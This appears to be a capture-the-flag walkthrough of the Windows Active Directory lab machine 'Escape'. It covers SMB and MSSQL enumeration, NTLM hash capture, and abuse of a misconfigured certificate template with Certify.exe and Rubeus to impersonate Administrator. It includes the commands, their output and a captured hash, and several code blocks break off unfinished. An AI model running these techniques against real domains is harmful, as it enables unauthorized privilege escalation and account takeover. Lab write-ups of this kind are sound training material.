Escape is a medium-difficulty Windows AD machine. It begins with an SMB share exposing a sensitive file containing credentials. Using these credentials, an attacker can gain access to the machine and escalate privileges. Further enumeration reveals a vulnerable certificate template that can be exploited to gain administrator access.

We realize that we are dealing with an Active Directory, and we identify the domain name, so we will add it to our `/etc/hosts`.
Additionally, we notice that the server's clock is 8 hours off from ours. Later, we will check if we need to synchronize it to interact with Kerberos.

And at port 3269 , we note that the certificate was issued by **sequel-DC-CA**. This is important because the **Certificate Authority (CA)** controls trust within the domain. If **ADCS** is misconfigured, it could allow attackers to issue unauthorized certificates or impersonate users, aiding in **privilege escalation** or **lateral movement** within the network.

````bash
nano /etc/hosts
10.10.11.202 dc.sequel.htb sequel.htb dc
````

### Enumerating SMB
---
We found a share that we can access, which is somewhat unusual.

````bash
❯ smbclient -L //10.10.11.202
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Public          Disk      
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
````

We accessed the share and dumped all its contents to our machine using the following command:

````bash
❯ smbclient //10.10.11.202/Public
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> mask ""

smb: \> mget *
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (179.2 KiloBytes/sec) (average 179.2 KiloBytes/sec)
````

We found a PDF, and in my case, I’ll open it with a Python server to view it more easily.

````bash
 sql.pdf
❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

### Enumerating MSSQL
---
We have found default credentials for the database, so we will connect to MSSQL using `impacket-mssqlclient`.

**Explanation:**

- **MSSQL (Microsoft SQL Server):** MSSQL is a relational database management system (RDBMS) developed by Microsoft. It is widely used in enterprise environments to store and manage large amounts of data, supporting complex queries, transactions, and data integrity.
    
- **impacket-mssqlclient:** `impacket-mssqlclient` is a tool from the Impacket suite, which provides scripts and utilities to interact with various network protocols in Windows environments. `mssqlclient` allows us to connect to an MSSQL server using the obtained credentials, enabling actions like executing SQL queries, exploiting SQL injection vulnerabilities, or accessing sensitive data stored in the database.

We tried running commands but couldn’t execute any, so we’ll need to try other methods.

### Man in the middle
---
In this attack, we take advantage of a vulnerability in the SMB protocol to intercept NTLMv2 authentication between the MSSQL server and a shared resource on the network. By performing a Man-in-the-Middle attack, we make the SQL server connect to our SMB server, allowing us to capture the NTLMv2 hashes generated during the authentication process. These hashes can later be used to attempt to obtain the user's credentials

**Using `impacket-smbserver.py`:**

We use **`impacket-smbserver.py`**, a tool from the **Impacket** suite, to create an SMB server that listens on the network. This allows us to emulate a shared resource that the MSSQL server will try to access.

**SQL Command `EXEC xp_dirtree`:**

To force the SQL server to connect to our SMB server, we execute the following SQL command on the victim machine:

````powershell

### Enumerating as sql_svc

Enumerating the service, we didn't find anything in his folder, but in the root of C, we found SQL Server logs.

After a period of enumeration without significant findings, I recalled an important detail. At port 3269, we observed that the certificate was issued by **sequel-DC-CA**. This is a critical observation because the **Certificate Authority (CA)** establishes trust within the domain. If **ADCS** is misconfigured, it could enable attackers to issue unauthorized certificates or impersonate users, thereby facilitating privilege escalation or lateral movement within the network.
So, we are going to perform some checks using  **Netexec** which is a lightweight network enumeration tool designed to scan and analyze various network services.

````powershell

## ROAD TO ADMINISTRATOR
---
### Using Certify.exe
---
We are going to transfer the Certify.exe tool to our victim machine, which you can download from <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Certify.exe" target="_blank">here</a>. With this tool, we will check whether the system is vulnerable to certificate enrollment misconfigurations.

This vulnerability arises when the Active Directory Certificate Services (ADCS) are improperly configured. In such cases, attackers can potentially request and obtain certificates from the enterprise CA without proper authorization. These misconfigurations can allow an attacker to enroll for certificates that grant elevated privileges or enable impersonation of legitimate users. By exploiting this weakness, an attacker could escalate privileges or move laterally within the network.

Using Certify.exe, we can test if the victim machine’s ADCS setup is susceptible to unauthorized certificate enrollment and assess the associated risks.

Now that we have identified the vulnerable certificate template, we can use Certify.exe to exploit it. This will allow us to request a certificate that could be used to impersonate the administrator account.

First, in our Evil-WinRM session, navigate to the directory where Certify.exe is located. Then, execute the following command to request a certificate from the domain's Certificate Authority using the vulnerable "UserAuthentication" template:

````powershell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents\t> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

   _____          _   _  __

  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 13

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----

-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----

(..cutted..)
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

````

Now that we have obtained the certificate, we need to copy both the **RSA PRIVATE KEY** and the **BEGIN CERTIFICATE** sections together into a single file named `cert.pem`. This file will contain our private key and the issued certificate, allowing us to authenticate using it.

Once the file is created, we will use the command provided by Certify.exe to leverage the certificate for authentication.

````powershell
❯ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

### Using Rubeus.exe
---
Now, we are going to use **Rubeus.exe**, a powerful tool for interacting with Kerberos tickets in Windows environments. In this context, we will use it to request a **Ticket Granting Ticket (TGT)** using the certificate we obtained and in this case we also get the hash NTLM. Download from <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Rubeus.exe" target="_blank">here</a>

````powershell

[*] Getting credentials using U2U

       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
````

Now that we have obtained the **NTLM hash** thanks to the **`/getcredentials`** option in **Rubeus**, we can use it to log in as **Administrator** and gain full control over the system.

### **How did we obtain the NTLM hash?**

The **`/getcredentials`** option in **Rubeus** attempts to retrieve credentials using **User-to-User (U2U) authentication**.

- **U2U authentication** is a Kerberos mechanism that allows a client to request a **service ticket** using an already obtained **TGT (Ticket Granting Ticket)**.
- If the **KDC (Key Distribution Center)** allows it, Rubeus can leverage this method to extract credential information associated with the obtained TGT.
- In this case, since the certificate we used provided a valid **TGT for Administrator**, the **KDC returned the NTLM hash** along with the ticket details.

With the **NTLM hash**, we can now authenticate as **Administrator** using **Pass-the-Hash (PtH)** techniques. This grants us full control over the compromised machine and, potentially, the entire domain.
